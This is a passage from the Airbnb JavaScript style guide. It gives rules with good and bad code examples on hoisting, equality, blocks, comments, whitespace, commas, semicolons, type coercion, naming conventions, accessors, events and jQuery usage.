...coords } = data;\n// 'coords' is now the 'data' object without its 'type' property.\n\n\n\u2b06 back to top\nHoisting\n\n\n\n14.1 var declarations get hoisted to the top of their closest enclosing function scope, their assignment does not. const and let declarations are blessed with a new concept called Temporal Dead Zones (TDZ). It\u2019s important to know why typeof is no longer safe.\n// we know this wouldn\u2019t work (assuming there\n// is no notDefined global variable)\nfunction example() {\n  console.log(notDefined); // => throws a ReferenceError\n}\n\n// creating a variable declaration after you\n// reference the variable will work due to\n// variable hoisting. Note: the assignment\n// value of `true` is not hoisted.\nfunction example() {\n  console.log(declaredButNotAssigned); // => undefined\n  var declaredButNotAssigned = true;\n}\n\n// the interpreter is hoisting the variable\n// declaration to the top of the scope,\n// which means our example could be rewritten as:\nfunction example() {\n  let declaredButNotAssigned;\n  console.log(declaredButNotAssigned); // => undefined\n  declaredButNotAssigned = true;\n}\n\n// using const and let\nfunction example() {\n  console.log(declaredButNotAssigned); // => throws a ReferenceError\n  console.log(typeof declaredButNotAssigned); // => throws a ReferenceError\n  const declaredButNotAssigned = true;\n}\n\n\n\n\n\n14.2 Anonymous function expressions hoist their variable name, but not the function assignment.\nfunction example() {\n  console.log(anonymous); // => undefined\n\n  anonymous(); // => TypeError anonymous is not a function\n\n  var anonymous = function () {\n    console.log('anonymous function expression');\n  };\n}\n\n\n\n\n\n14.3 Named function expressions hoist the variable name, not the function name or the function body.\nfunction example() {\n  console.log(named); // => undefined\n\n  named(); // => TypeError named is not a function\n\n  superPower(); // => ReferenceError superPower is not defined\n\n  var named = function superPower() {\n    console.log('Flying');\n  };\n}\n\n// the same is true when the function name\n// is the same as the variable name.\nfunction example() {\n  console.log(named); // => undefined\n\n  named(); // => TypeError named is not a function\n\n  var named = function named() {\n    console.log('named');\n  };\n}\n\n\n\n\n\n14.4 Function declarations hoist their name and the function body.\nfunction example() {\n  superPower(); // => Flying\n\n  function superPower() {\n    console.log('Flying');\n  }\n}\n\n\nFor more information refer to JavaScript Scoping & Hoisting by Ben Cherry.\n\n\n\u2b06 back to top\nComparison Operators & Equality\n\n\n15.1 Use === and !== over == and !=. eslint: eqeqeq\n\n\n\n\n15.2 Conditional statements such as the if statement evaluate their expression using coercion with the ToBoolean abstract method and always follow these simple rules:\n\nObjects evaluate to true\nUndefined evaluates to false\nNull evaluates to false\nBooleans evaluate to the value of the boolean\nNumbers evaluate to false if +0, -0, or NaN, otherwise true\nStrings evaluate to false if an empty string '', otherwise true\n\nif ([0] && []) {\n  // true\n  // an array (even an empty one) is an object, objects will evaluate to true\n}\n\n\n\n\n\n15.3 Use shortcuts for booleans, but explicit comparisons for strings and numbers.\n// bad\nif (isValid === true) {\n  // ...\n}\n\n// good\nif (isValid) {\n  // ...\n}\n\n// bad\nif (name) {\n  // ...\n}\n\n// good\nif (name !== '') {\n  // ...\n}\n\n// bad\nif (collection.length) {\n  // ...\n}\n\n// good\nif (collection.length > 0) {\n  // ...\n}\n\n\n\n\n15.4 For more information see Truth Equality and JavaScript by Angus Croll.\n\n\n\n\n15.5 Use braces to create blocks in case and default clauses that contain lexical declarations (e.g. let, const, function, and class). eslint: no-case-declarations\n\nWhy? Lexical declarations are visible in the entire switch block but only get initialized when assigned, which only happens when its case is reached. This causes problems when multiple case clauses attempt to define the same thing.\n\n// bad\nswitch (foo) {\n  case 1:\n    let x = 1;\n    break;\n  case 2:\n    const y = 2;\n    break;\n  case 3:\n    function f() {\n      // ...\n    }\n    break;\n  default:\n    class C {}\n}\n\n// good\nswitch (foo) {\n  case 1: {\n    let x = 1;\n    break;\n  }\n  case 2: {\n    const y = 2;\n    break;\n  }\n  case 3: {\n    function f() {\n      // ...\n    }\n    break;\n  }\n  case 4:\n    bar();\n    break;\n  default: {\n    class C {}\n  }\n}\n\n\n\n\n\n15.6 Ternaries should not be nested and generally be single line expressions. eslint: no-nested-ternary\n// bad\nconst foo = maybe1 > maybe2\n  ? \"bar\"\n  : value1 > value2 ? \"baz\" : null;\n\n// split into 2 separated ternary expressions\nconst maybeNull = value1 > value2 ? 'baz' : null;\n\n// better\nconst foo = maybe1 > maybe2\n  ? 'bar'\n  : maybeNull;\n\n// best\nconst foo = maybe1 > maybe2 ? 'bar' : maybeNull;\n\n\n\n\n\n15.7 Avoid unneeded ternary statements. eslint: no-unneeded-ternary\n// bad\nconst foo = a ? a : b;\nconst bar = c ? true : false;\nconst baz = c ? false : true;\n\n// good\nconst foo = a || b;\nconst bar = !!c;\nconst baz = !c;\n\n\n\n\n\n15.8 When mixing operators, enclose them in parentheses. The only exception is the standard arithmetic operators (+, -, *, & /) since their precedence is broadly understood. eslint: no-mixed-operators\n\nWhy? This improves readability and clarifies the developer\u2019s intention.\n\n// bad\nconst foo = a && b < 0 || c > 0 || d + 1 === 0;\n\n// bad\nconst bar = a ** b - 5 % d;\n\n// bad\n// one may be confused into thinking (a || b) && c\nif (a || b && c) {\n  return d;\n}\n\n// good\nconst foo = (a && b < 0) || c > 0 || (d + 1 === 0);\n\n// good\nconst bar = (a ** b) - (5 % d);\n\n// good\nif (a || (b && c)) {\n  return d;\n}\n\n// good\nconst bar = a + b / c * d;\n\n\n\u2b06 back to top\nBlocks\n\n\n\n16.1 Use braces with all multi-line blocks. eslint: nonblock-statement-body-position\n// bad\nif (test)\n  return false;\n\n// good\nif (test) return false;\n\n// good\nif (test) {\n  return false;\n}\n\n// bad\nfunction foo() { return false; }\n\n// good\nfunction bar() {\n  return false;\n}\n\n\n\n\n\n16.2 If you\u2019re using multi-line blocks with if and else, put else on the same line as your if block\u2019s closing brace. eslint: brace-style\n// bad\nif (test) {\n  thing1();\n  thing2();\n}\nelse {\n  thing3();\n}\n\n// good\nif (test) {\n  thing1();\n  thing2();\n} else {\n  thing3();\n}\n\n\n\n\n\n16.3 If an if block always executes a return statement, the subsequent else block is unnecessary. A return in an else if block following an if block that contains a return can be separated into multiple if blocks. eslint: no-else-return\n// bad\nfunction foo() {\n  if (x) {\n    return x;\n  } else {\n    return y;\n  }\n}\n\n// bad\nfunction cats() {\n  if (x) {\n    return x;\n  } else if (y) {\n    return y;\n  }\n}\n\n// bad\nfunction dogs() {\n  if (x) {\n    return x;\n  } else {\n    if (y) {\n      return y;\n    }\n  }\n}\n\n// good\nfunction foo() {\n  if (x) {\n    return x;\n  }\n\n  return y;\n}\n\n// good\nfunction cats() {\n  if (x) {\n    return x;\n  }\n\n  if (y) {\n    return y;\n  }\n}\n\n// good\nfunction dogs(x) {\n  if (x) {\n    if (z) {\n      return y;\n    }\n  } else {\n    return z;\n  }\n}\n\n\n\u2b06 back to top\nControl Statements\n\n\n\n17.1 In case your control statement (if, while etc.) gets too long or exceeds the maximum line length, each (grouped) condition could be put into a new line. The logical operator should begin the line.\n\nWhy? Requiring operators at the beginning of the line keeps the operators aligned and follows a pattern similar to method chaining. This also improves readability by making it easier to visually follow complex logic.\n\n// bad\nif ((foo === 123 || bar === 'abc') && doesItLookGoodWhenItBecomesThatLong() && isThisReallyHappening()) {\n  thing1();\n}\n\n// bad\nif (foo === 123 &&\n  bar === 'abc') {\n  thing1();\n}\n\n// bad\nif (foo === 123\n  && bar === 'abc') {\n  thing1();\n}\n\n// bad\nif (\n  foo === 123 &&\n  bar === 'abc'\n) {\n  thing1();\n}\n\n// good\nif (\n  foo === 123\n  && bar === 'abc'\n) {\n  thing1();\n}\n\n// good\nif (\n  (foo === 123 || bar === 'abc')\n  && doesItLookGoodWhenItBecomesThatLong()\n  && isThisReallyHappening()\n) {\n  thing1();\n}\n\n// good\nif (foo === 123 && bar === 'abc') {\n  thing1();\n}\n\n\n\n\n\n17.2 Don't use selection operators in place of control statements.\n// bad\n!isRunning && startRunning();\n\n// good\nif (!isRunning) {\n  startRunning();\n}\n\n\n\u2b06 back to top\nComments\n\n\n\n18.1 Use /** ... */ for multi-line comments.\n// bad\n// make() returns a new element\n// based on the passed in tag name\n//\n// @param {String} tag\n// @return {Element} element\nfunction make(tag) {\n\n  // ...\n\n  return element;\n}\n\n// good\n/**\n * make() returns a new element\n * based on the passed-in tag name\n */\nfunction make(tag) {\n\n  // ...\n\n  return element;\n}\n\n\n\n\n\n18.2 Use // for single line comments. Place single line comments on a newline above the subject of the comment. Put an empty line before the comment unless it\u2019s on the first line of a block.\n// bad\nconst active = true;  // is current tab\n\n// good\n// is current tab\nconst active = true;\n\n// bad\nfunction getType() {\n  console.log('fetching type...');\n  // set the default type to 'no type'\n  const type = this.type || 'no type';\n\n  return type;\n}\n\n// good\nfunction getType() {\n  console.log('fetching type...');\n\n  // set the default type to 'no type'\n  const type = this.type || 'no type';\n\n  return type;\n}\n\n// also good\nfunction getType() {\n  // set the default type to 'no type'\n  const type = this.type || 'no type';\n\n  return type;\n}\n\n\n\n\n\n18.3 Start all comments with a space to make it easier to read. eslint: spaced-comment\n// bad\n//is current tab\nconst active = true;\n\n// good\n// is current tab\nconst active = true;\n\n// bad\n/**\n *make() returns a new element\n *based on the passed-in tag name\n */\nfunction make(tag) {\n\n  // ...\n\n  return element;\n}\n\n// good\n/**\n * make() returns a new element\n * based on the passed-in tag name\n */\nfunction make(tag) {\n\n  // ...\n\n  return element;\n}\n\n\n\n\n18.4 Prefixing your comments with FIXME or TODO helps other developers quickly understand if you\u2019re pointing out a problem that needs to be revisited, or if you\u2019re suggesting a solution to the problem that needs to be implemented. These are different than regular comments because they are actionable. The actions are FIXME: -- need to figure this out or TODO: -- need to implement.\n\n\n\n\n18.5 Use // FIXME: to annotate problems.\nclass Calculator extends Abacus {\n  constructor() {\n    super();\n\n    // FIXME: shouldn\u2019t use a global here\n    total = 0;\n  }\n}\n\n\n\n\n\n18.6 Use // TODO: to annotate solutions to problems.\nclass Calculator extends Abacus {\n  constructor() {\n    super();\n\n    // TODO: total should be configurable by an options param\n    this.total = 0;\n  }\n}\n\n\n\u2b06 back to top\nWhitespace\n\n\n\n19.1 Use soft tabs (space character) set to 2 spaces. eslint: indent\n// bad\nfunction foo() {\n\u2219\u2219\u2219\u2219let name;\n}\n\n// bad\nfunction bar() {\n\u2219let name;\n}\n\n// good\nfunction baz() {\n\u2219\u2219let name;\n}\n\n\n\n\n\n19.2 Place 1 space before the leading brace. eslint: space-before-blocks\n// bad\nfunction test(){\n  console.log('test');\n}\n\n// good\nfunction test() {\n  console.log('test');\n}\n\n// bad\ndog.set('attr',{\n  age: '1 year',\n  breed: 'Bernese Mountain Dog',\n});\n\n// good\ndog.set('attr', {\n  age: '1 year',\n  breed: 'Bernese Mountain Dog',\n});\n\n\n\n\n\n19.3 Place 1 space before the opening parenthesis in control statements (if, while etc.). Place no space between the argument list and the function name in function calls and declarations. eslint: keyword-spacing\n// bad\nif(isJedi) {\n  fight ();\n}\n\n// good\nif (isJedi) {\n  fight();\n}\n\n// bad\nfunction fight () {\n  console.log ('Swooosh!');\n}\n\n// good\nfunction fight() {\n  console.log('Swooosh!');\n}\n\n\n\n\n\n19.4 Set off operators with spaces. eslint: space-infix-ops\n// bad\nconst x=y+5;\n\n// good\nconst x = y + 5;\n\n\n\n\n\n19.5 End files with a single newline character. eslint: eol-last\n// bad\nimport { es6 } from './AirbnbStyleGuide';\n  // ...\nexport default es6;\n// bad\nimport { es6 } from './AirbnbStyleGuide';\n  // ...\nexport default es6;\u21b5\n\u21b5\n// good\nimport { es6 } from './AirbnbStyleGuide';\n  // ...\nexport default es6;\u21b5\n\n\n\n\n\n19.6 Use indentation when making long method chains (more than 2 method chains). Use a leading dot, which\nemphasizes that the line is a method call, not a new statement. eslint: newline-per-chained-call no-whitespace-before-property\n// bad\n$('#items').find('.selected').highlight().end().find('.open').updateCount();\n\n// bad\n$('#items').\n  find('.selected').\n    highlight().\n    end().\n  find('.open').\n    updateCount();\n\n// good\n$('#items')\n  .find('.selected')\n    .highlight()\n    .end()\n  .find('.open')\n    .updateCount();\n\n// bad\nconst leds = stage.selectAll('.led').data(data).enter().append('svg:svg').classed('led', true)\n    .attr('width', (radius + margin) * 2).append('svg:g')\n    .attr('transform', `translate(${radius + margin},${radius + margin})`)\n    .call(tron.led);\n\n// good\nconst leds = stage.selectAll('.led')\n    .data(data)\n  .enter().append('svg:svg')\n    .classed('led', true)\n    .attr('width', (radius + margin) * 2)\n  .append('svg:g')\n    .attr('transform', `translate(${radius + margin},${radius + margin})`)\n    .call(tron.led);\n\n// good\nconst leds = stage.selectAll('.led').data(data);\n\n\n\n\n\n19.7 Leave a blank line after blocks and before the next statement.\n// bad\nif (foo) {\n  return bar;\n}\nreturn baz;\n\n// good\nif (foo) {\n  return bar;\n}\n\nreturn baz;\n\n// bad\nconst obj = {\n  foo() {\n  },\n  bar() {\n  },\n};\nreturn obj;\n\n// good\nconst obj = {\n  foo() {\n  },\n\n  bar() {\n  },\n};\n\nreturn obj;\n\n// bad\nconst arr = [\n  function foo() {\n  },\n  function bar() {\n  },\n];\nreturn arr;\n\n// good\nconst arr = [\n  function foo() {\n  },\n\n  function bar() {\n  },\n];\n\nreturn arr;\n\n\n\n\n\n19.8 Do not pad your blocks with blank lines. eslint: padded-blocks\n// bad\nfunction bar() {\n\n  console.log(foo);\n\n}\n\n// bad\nif (baz) {\n\n  console.log(qux);\n} else {\n  console.log(foo);\n\n}\n\n// bad\nclass Foo {\n\n  constructor(bar) {\n    this.bar = bar;\n  }\n}\n\n// good\nfunction bar() {\n  console.log(foo);\n}\n\n// good\nif (baz) {\n  console.log(qux);\n} else {\n  console.log(foo);\n}\n\n\n\n\n\n19.9 Do not use multiple blank lines to pad your code. eslint: no-multiple-empty-lines\n// bad\nclass Person {\n  constructor(fullName, email, birthday) {\n    this.fullName = fullName;\n\n\n    this.email = email;\n\n\n    this.setAge(birthday);\n  }\n\n\n  setAge(birthday) {\n    const today = new Date();\n\n\n    const age = this.getAge(today, birthday);\n\n\n    this.age = age;\n  }\n\n\n  getAge(today, birthday) {\n    // ..\n  }\n}\n\n// good\nclass Person {\n  constructor(fullName, email, birthday) {\n    this.fullName = fullName;\n    this.email = email;\n    this.setAge(birthday);\n  }\n\n  setAge(birthday) {\n    const today = new Date();\n    const age = getAge(today, birthday);\n    this.age = age;\n  }\n\n  getAge(today, birthday) {\n    // ..\n  }\n}\n\n\n\n\n\n19.10 Do not add spaces inside parentheses. eslint: space-in-parens\n// bad\nfunction bar( foo ) {\n  return foo;\n}\n\n// good\nfunction bar(foo) {\n  return foo;\n}\n\n// bad\nif ( foo ) {\n  console.log(foo);\n}\n\n// good\nif (foo) {\n  console.log(foo);\n}\n\n\n\n\n\n19.11 Do not add spaces inside brackets. eslint: array-bracket-spacing\n// bad\nconst foo = [ 1, 2, 3 ];\nconsole.log(foo[ 0 ]);\n\n// good\nconst foo = [1, 2, 3];\nconsole.log(foo[0]);\n\n\n\n\n\n19.12 Add spaces inside curly braces. eslint: object-curly-spacing\n// bad\nconst foo = {clark: 'kent'};\n\n// good\nconst foo = { clark: 'kent' };\n\n\n\n\n\n19.13 Avoid having lines of code that are longer than 100 characters (including whitespace). Note: per above, long strings are exempt from this rule, and should not be broken up. eslint: max-len\n\nWhy? This ensures readability and maintainability.\n\n// bad\nconst foo = jsonData && jsonData.foo && jsonData.foo.bar && jsonData.foo.bar.baz && jsonData.foo.bar.baz.quux && jsonData.foo.bar.baz.quux.xyzzy;\n\n// bad\n$.ajax({ method: 'POST', url: 'https://airbnb.com/', data: { name: 'John' } }).done(() => console.log('Congratulations!')).fail(() => console.log('You have failed this city.'));\n\n// good\nconst foo = jsonData\n  && jsonData.foo\n  && jsonData.foo.bar\n  && jsonData.foo.bar.baz\n  && jsonData.foo.bar.baz.quux\n  && jsonData.foo.bar.baz.quux.xyzzy;\n\n// good\n$.ajax({\n  method: 'POST',\n  url: 'https://airbnb.com/',\n  data: { name: 'John' },\n})\n  .done(() => console.log('Congratulations!'))\n  .fail(() => console.log('You have failed this city.'));\n\n\n\n\n\n19.14 Require consistent spacing inside an open block token and the next token on the same line. This rule also enforces consistent spacing inside a close block token and previous token on the same line. eslint: block-spacing\n// bad\nfunction foo() {return true;}\nif (foo) { bar = 0;}\n\n// good\nfunction foo() { return true; }\nif (foo) { bar = 0; }\n\n\n\n\n\n19.15 Avoid spaces before commas and require a space after commas. eslint: comma-spacing\n// bad\nvar foo = 1,bar = 2;\nvar arr = [1 , 2];\n\n// good\nvar foo = 1, bar = 2;\nvar arr = [1, 2];\n\n\n\n\n\n19.16 Enforce spacing inside of computed property brackets. eslint: computed-property-spacing\n// bad\nobj[foo ]\nobj[ 'foo']\nvar x = {[ b ]: a}\nobj[foo[ bar ]]\n\n// good\nobj[foo]\nobj['foo']\nvar x = { [b]: a }\nobj[foo[bar]]\n\n\n\n\n\n19.17 Avoid spaces between functions and their invocations. eslint: func-call-spacing\n// bad\nfunc ();\n\nfunc\n();\n\n// good\nfunc();\n\n\n\n\n\n19.18 Enforce spacing between keys and values in object literal properties. eslint: key-spacing\n// bad\nvar obj = { \"foo\" : 42 };\nvar obj2 = { \"foo\":42 };\n\n// good\nvar obj = { \"foo\": 42 };\n\n\n\n\n19.19 Avoid trailing spaces at the end of lines. eslint: no-trailing-spaces\n\n\n\n\n19.20 Avoid multiple empty lines and only allow one newline at the end of files. eslint: no-multiple-empty-lines\n// bad\nvar x = 1;\n\n\n\nvar y = 2;\n\n// good\nvar x = 1;\n\nvar y = 2;\n\n\n\u2b06 back to top\nCommas\n\n\n\n20.1 Leading commas: Nope. eslint: comma-style\n// bad\nconst story = [\n    once\n  , upon\n  , aTime\n];\n\n// good\nconst story = [\n  once,\n  upon,\n  aTime,\n];\n\n// bad\nconst hero = {\n    firstName: 'Ada'\n  , lastName: 'Lovelace'\n  , birthYear: 1815\n  , superPower: 'computers'\n};\n\n// good\nconst hero = {\n  firstName: 'Ada',\n  lastName: 'Lovelace',\n  birthYear: 1815,\n  superPower: 'computers',\n};\n\n\n\n\n\n20.2 Additional trailing comma: Yup. eslint: comma-dangle\n\nWhy? This leads to cleaner git diffs. Also, transpilers like Babel will remove the additional trailing comma in the transpiled code which means you don\u2019t have to worry about the trailing comma problem in legacy browsers.\n\n// bad - git diff without trailing comma\nconst hero = {\n     firstName: 'Florence',\n-    lastName: 'Nightingale'\n+    lastName: 'Nightingale',\n+    inventorOf: ['coxcomb chart', 'modern nursing']\n};\n\n// good - git diff with trailing comma\nconst hero = {\n     firstName: 'Florence',\n     lastName: 'Nightingale',\n+    inventorOf: ['coxcomb chart', 'modern nursing'],\n};\n// bad\nconst hero = {\n  firstName: 'Dana',\n  lastName: 'Scully'\n};\n\nconst heroes = [\n  'Batman',\n  'Superman'\n];\n\n// good\nconst hero = {\n  firstName: 'Dana',\n  lastName: 'Scully',\n};\n\nconst heroes = [\n  'Batman',\n  'Superman',\n];\n\n// bad\nfunction createHero(\n  firstName,\n  lastName,\n  inventorOf\n) {\n  // does nothing\n}\n\n// good\nfunction createHero(\n  firstName,\n  lastName,\n  inventorOf,\n) {\n  // does nothing\n}\n\n// good (note that a comma must not appear after a \"rest\" element)\nfunction createHero(\n  firstName,\n  lastName,\n  inventorOf,\n  ...heroArgs\n) {\n  // does nothing\n}\n\n// bad\ncreateHero(\n  firstName,\n  lastName,\n  inventorOf\n);\n\n// good\ncreateHero(\n  firstName,\n  lastName,\n  inventorOf,\n);\n\n// good (note that a comma must not appear after a \"rest\" element)\ncreateHero(\n  firstName,\n  lastName,\n  inventorOf,\n  ...heroArgs\n);\n\n\n\u2b06 back to top\nSemicolons\n\n\n\n21.1 Yup. eslint: semi\n\nWhy? When JavaScript encounters a line break without a semicolon, it uses a set of rules called Automatic Semicolon Insertion to determine whether or not it should regard that line break as the end of a statement, and (as the name implies) place a semicolon into your code before the line break if it thinks so. ASI contains a few eccentric behaviors, though, and your code will break if JavaScript misinterprets your line break. These rules will become more complicated as new features become a part of JavaScript. Explicitly terminating your statements and configuring your linter to catch missing semicolons will help prevent you from encountering issues.\n\n// bad - raises exception\nconst luke = {}\nconst leia = {}\n[luke, leia].forEach(jedi => jedi.father = 'vader')\n\n// bad - raises exception\nconst reaction = \"No! That\u2019s impossible!\"\n(async function meanwhileOnTheFalcon() {\n  // handle `leia`, `lando`, `chewie`, `r2`, `c3p0`\n  // ...\n}())\n\n// bad - returns `undefined` instead of the value on the next line - always happens when `return` is on a line by itself because of ASI!\nfunction foo() {\n  return\n    'search your feelings, you know it to be foo'\n}\n\n// good\nconst luke = {};\nconst leia = {};\n[luke, leia].forEach((jedi) => {\n  jedi.father = 'vader';\n});\n\n// good\nconst reaction = \"No! That\u2019s impossible!\";\n(async function meanwhileOnTheFalcon() {\n  // handle `leia`, `lando`, `chewie`, `r2`, `c3p0`\n  // ...\n}());\n\n// good\nfunction foo() {\n  return 'search your feelings, you know it to be foo';\n}\nRead more.\n\n\n\u2b06 back to top\nType Casting & Coercion\n\n\n22.1 Perform type coercion at the beginning of the statement.\n\n\n\n\n22.2  Strings: eslint: no-new-wrappers\n// => this.reviewScore = 9;\n\n// bad\nconst totalScore = new String(this.reviewScore); // typeof totalScore is \"object\" not \"string\"\n\n// bad\nconst totalScore = this.reviewScore + ''; // invokes this.reviewScore.valueOf()\n\n// bad\nconst totalScore = this.reviewScore.toString(); // isn\u2019t guaranteed to return a string\n\n// good\nconst totalScore = String(this.reviewScore);\n\n\n\n\n\n22.3 Numbers: Use Number for type casting and parseInt always with a radix for parsing strings. eslint: radix no-new-wrappers\nconst inputValue = '4';\n\n// bad\nconst val = new Number(inputValue);\n\n// bad\nconst val = +inputValue;\n\n// bad\nconst val = inputValue >> 0;\n\n// bad\nconst val = parseInt(inputValue);\n\n// good\nconst val = Number(inputValue);\n\n// good\nconst val = parseInt(inputValue, 10);\n\n\n\n\n\n22.4 If for whatever reason you are doing something wild and parseInt is your bottleneck and need to use Bitshift for performance reasons, leave a comment explaining why and what you\u2019re doing.\n// good\n/**\n * parseInt was the reason my code was slow.\n * Bitshifting the String to coerce it to a\n * Number made it a lot faster.\n */\nconst val = inputValue >> 0;\n\n\n\n\n\n22.5 Note: Be careful when using bitshift operations. Numbers are represented as 64-bit values, but bitshift operations always return a 32-bit integer (source). Bitshift can lead to unexpected behavior for integer values larger than 32 bits. Discussion. Largest signed 32-bit Int is 2,147,483,647:\n2147483647 >> 0; // => 2147483647\n2147483648 >> 0; // => -2147483648\n2147483649 >> 0; // => -2147483647\n\n\n\n\n\n22.6 Booleans: eslint: no-new-wrappers\nconst age = 0;\n\n// bad\nconst hasAge = new Boolean(age);\n\n// good\nconst hasAge = Boolean(age);\n\n// best\nconst hasAge = !!age;\n\n\n\u2b06 back to top\nNaming Conventions\n\n\n\n23.1 Avoid single letter names. Be descriptive with your naming. eslint: id-length\n// bad\nfunction q() {\n  // ...\n}\n\n// good\nfunction query() {\n  // ...\n}\n\n\n\n\n\n23.2 Use camelCase when naming objects, functions, and instances. eslint: camelcase\n// bad\nconst OBJEcttsssss = {};\nconst this_is_my_object = {};\nfunction c() {}\n\n// good\nconst thisIsMyObject = {};\nfunction thisIsMyFunction() {}\n\n\n\n\n\n23.3 Use PascalCase only when naming constructors or classes. eslint: new-cap\n// bad\nfunction user(options) {\n  this.name = options.name;\n}\n\nconst bad = new user({\n  name: 'nope',\n});\n\n// good\nclass User {\n  constructor(options) {\n    this.name = options.name;\n  }\n}\n\nconst good = new User({\n  name: 'yup',\n});\n\n\n\n\n\n23.4 Do not use trailing or leading underscores. eslint: no-underscore-dangle\n\nWhy? JavaScript does not have the concept of privacy in terms of properties or methods. Although a leading underscore is a common convention to mean \u201cprivate\u201d, in fact, these properties are fully public, and as such, are part of your public API contract. This convention might lead developers to wrongly think that a change won\u2019t count as breaking, or that tests aren\u2019t needed. tl;dr: if you want something to be \u201cprivate\u201d, it must not be observably present.\n\n// bad\nthis.__firstName__ = 'Panda';\nthis.firstName_ = 'Panda';\nthis._firstName = 'Panda';\n\n// good\nthis.firstName = 'Panda';\n\n// good, in environments where WeakMaps are available\n// see https://kangax.github.io/compat-table/es6/#test-WeakMap\nconst firstNames = new WeakMap();\nfirstNames.set(this, 'Panda');\n\n\n\n\n\n23.5 Don\u2019t save references to this. Use arrow functions or Function#bind.\n// bad\nfunction foo() {\n  const self = this;\n  return function () {\n    console.log(self);\n  };\n}\n\n// bad\nfunction foo() {\n  const that = this;\n  return function () {\n    console.log(that);\n  };\n}\n\n// good\nfunction foo() {\n  return () => {\n    console.log(this);\n  };\n}\n\n\n\n\n\n23.6 A base filename should exactly match the name of its default export.\n// file 1 contents\nclass CheckBox {\n  // ...\n}\nexport default CheckBox;\n\n// file 2 contents\nexport default function fortyTwo() { return 42; }\n\n// file 3 contents\nexport default function insideDirectory() {}\n\n// in some other file\n// bad\nimport CheckBox from './checkBox'; // PascalCase import/export, camelCase filename\nimport FortyTwo from './FortyTwo'; // PascalCase import/filename, camelCase export\nimport InsideDirectory from './InsideDirectory'; // PascalCase import/filename, camelCase export\n\n// bad\nimport CheckBox from './check_box'; // PascalCase import/export, snake_case filename\nimport forty_two from './forty_two'; // snake_case import/filename, camelCase export\nimport inside_directory from './inside_directory'; // snake_case import, camelCase export\nimport index from './inside_directory/index'; // requiring the index file explicitly\nimport insideDirectory from './insideDirectory/index'; // requiring the index file explicitly\n\n// good\nimport CheckBox from './CheckBox'; // PascalCase export/import/filename\nimport fortyTwo from './fortyTwo'; // camelCase export/import/filename\nimport insideDirectory from './insideDirectory'; // camelCase export/import/directory name/implicit \"index\"\n// ^ supports both insideDirectory.js and insideDirectory/index.js\n\n\n\n\n\n23.7 Use camelCase when you export-default a function. Your filename should be identical to your function\u2019s name.\nfunction makeStyleGuide() {\n  // ...\n}\n\nexport default makeStyleGuide;\n\n\n\n\n\n23.8 Use PascalCase when you export a constructor / class / singleton / function library / bare object.\nconst AirbnbStyleGuide = {\n  es6: {\n  },\n};\n\nexport default AirbnbStyleGuide;\n\n\n\n\n\n23.9 Acronyms and initialisms should always be all uppercased, or all lowercased.\n\nWhy? Names are for readability, not to appease a computer algorithm.\n\n// bad\nimport SmsContainer from './containers/SmsContainer';\n\n// bad\nconst HttpRequests = [\n  // ...\n];\n\n// good\nimport SMSContainer from './containers/SMSContainer';\n\n// good\nconst HTTPRequests = [\n  // ...\n];\n\n// also good\nconst httpRequests = [\n  // ...\n];\n\n// best\nimport TextMessageContainer from './containers/TextMessageContainer';\n\n// best\nconst requests = [\n  // ...\n];\n\n\n\n\n\n23.10 You may optionally uppercase a constant only if it (1) is exported, (2) is a const (it can not be reassigned), and (3) the programmer can trust it (and its nested properties) to never change.\n\nWhy? This is an additional tool to assist in situations where the programmer would be unsure if a variable might ever change. UPPERCASE_VARIABLES are letting the programmer know that they can trust the variable (and its properties) not to change.\n\n\nWhat about all const variables? - This is unnecessary, so uppercasing should not be used for constants within a file. It should be used for exported constants however.\nWhat about exported objects? - Uppercase at the top level of export  (e.g. EXPORTED_OBJECT.key) and maintain that all nested properties do not change.\n\n// bad\nconst PRIVATE_VARIABLE = 'should not be unnecessarily uppercased within a file';\n\n// bad\nexport const THING_TO_BE_CHANGED = 'should obviously not be uppercased';\n\n// bad\nexport let REASSIGNABLE_VARIABLE = 'do not use let with uppercase variables';\n\n// ---\n\n// allowed but does not supply semantic value\nexport const apiKey = 'SOMEKEY';\n\n// better in most cases\nexport const API_KEY = 'SOMEKEY';\n\n// ---\n\n// bad - unnecessarily uppercases key while adding no semantic value\nexport const MAPPING = {\n  KEY: 'value'\n};\n\n// good\nexport const MAPPING = {\n  key: 'value'\n};\n\n\n\u2b06 back to top\nAccessors\n\n\n24.1 Accessor functions for properties are not required.\n\n\n\n\n24.2 Do not use JavaScript getters/setters as they cause unexpected side effects and are harder to test, maintain, and reason about. Instead, if you do make accessor functions, use getVal() and setVal('hello').\n// bad\nclass Dragon {\n  get age() {\n    // ...\n  }\n\n  set age(value) {\n    // ...\n  }\n}\n\n// good\nclass Dragon {\n  getAge() {\n    // ...\n  }\n\n  setAge(value) {\n    // ...\n  }\n}\n\n\n\n\n\n24.3 If the property/method is a boolean, use isVal() or hasVal().\n// bad\nif (!dragon.age()) {\n  return false;\n}\n\n// good\nif (!dragon.hasAge()) {\n  return false;\n}\n\n\n\n\n\n24.4 It\u2019s okay to create get() and set() functions, but be consistent.\nclass Jedi {\n  constructor(options = {}) {\n    const lightsaber = options.lightsaber || 'blue';\n    this.set('lightsaber', lightsaber);\n  }\n\n  set(key, val) {\n    this[key] = val;\n  }\n\n  get(key) {\n    return this[key];\n  }\n}\n\n\n\u2b06 back to top\nEvents\n\n\n\n25.1 When attaching data payloads to events (whether DOM events or something more proprietary like Backbone events), pass an object literal (also known as a \"hash\")  instead of a raw value. This allows a subsequent contributor to add more data to the event payload without finding and updating every handler for the event. For example, instead of:\n// bad\n$(this).trigger('listingUpdated', listing.id);\n\n// ...\n\n$(this).on('listingUpdated', (e, listingID) => {\n  // do something with listingID\n});\nprefer:\n// good\n$(this).trigger('listingUpdated', { listingID: listing.id });\n\n// ...\n\n$(this).on('listingUpdated', (e, data) => {\n  // do something with data.listingID\n});\n\n\n\u2b06 back to top\njQuery\n\n\n\n26.1 Prefix jQuery object variables with a $.\n// bad\nconst sidebar = $('.sidebar');\n\n// good\nconst $sidebar = $('.sidebar');\n\n// good\nconst $sidebarBtn = $('.sidebar-btn');\n\n\n\n\n\n26.2 Cache jQuery lookups.\n// bad\nfunction setSidebar() {\n  $('.sidebar').hide();\n\n  // ...\n\n  $('.sidebar').css({\n    'background-color': 'pink',\n  });\n}\n\n// good\nfunction setSidebar() {\n  const $sidebar = $('.sidebar');\n  $sidebar.hide();\n\n  // ...\n\n  $sidebar.css({\n    'background-color': 'pink',\n  });\n}\n\n\n\n\n26.3 For DOM queries use Cascading $('.sidebar ul') or parent > child $('.sidebar > ul'). jsPerf\n\n\n\n\n26.4 Use find with scoped jQuery object queries.\n// 